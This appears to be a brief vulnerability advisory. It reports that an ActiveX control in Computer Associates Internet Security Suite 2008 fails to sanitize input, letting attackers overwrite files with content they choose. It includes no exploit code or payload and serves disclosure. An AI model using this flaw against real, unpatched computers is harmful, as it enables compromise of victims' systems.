A Computer Associates Internet Security Suite ActiveX control is prone to a vulnerability that lets attackers overwrite files with arbitrary, attacker-controlled content. The issue occurs because the control fails to sanitize user-supplied input.

Successful exploits will compromise affected computers and will aid in further attacks.

Internet Security Suite 2008 is vulnerable; other versions may also be affected.
